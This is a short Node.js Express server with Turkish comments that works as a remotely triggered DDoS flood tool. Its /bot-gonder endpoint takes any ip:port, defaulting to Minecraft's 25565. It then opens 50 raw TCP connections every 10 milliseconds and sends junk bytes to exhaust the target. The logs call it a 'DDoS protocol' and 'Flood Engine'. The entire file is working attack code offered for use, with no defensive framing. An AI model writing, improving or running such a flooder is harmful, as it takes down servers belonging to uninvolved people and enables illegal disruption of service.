const express = require('express');
const net = require('net'); // Düşük seviye ağ kütüphanesi
const cors = require('cors');
const app = express();
const port = process.env.PORT || 10000;

app.use(cors());

let attackInterval = null;

app.get('/bot-gonder', (req, res) => {
    const { ip } = req.query;
    const host = ip.split(':')[0];
    const targetPort = parseInt(ip.split(':')[1]) || 25565;

    if (attackInterval) clearInterval(attackInterval);

    console.log(`[DDOS PROTOKOLÜ] Hedef: ${host}:${targetPort} | Paketler fırlatılıyor...`);

    // Saldırı Döngüsü
    attackInterval = setInterval(() => {
        // Aynı anda 50 adet ham TCP bağlantısı başlat
        for (let i = 0; i < 50; i++) {
            const socket = new net.Socket();
            
            socket.setTimeout(2000); // 2 saniye içinde cevap gelmezse iptal et
            
            socket.connect(targetPort, host, () => {
                // Bağlantı kurulduğu an sunucuyu yormak için anlamsız veri gönder
                socket.write(Buffer.from([0x00, 0x00, 0x00, 0x00])); 
                socket.destroy(); // Hemen kapat ki yeni bağlantı için yer açılsın
            });

            socket.on('error', () => {
                socket.destroy();
            });
        }
    }, 10); // Her 10 milisaniyede bir 50 bağlantı!

    res.send("DDoS Protokolü Aktif. Ağ trafiği şişiriliyor.");
});

app.get('/bot-zipla', (req, res) => res.send("OK"));
app.listen(port, '0.0.0.0', () => console.log("Flood Engine Ready."));
                       
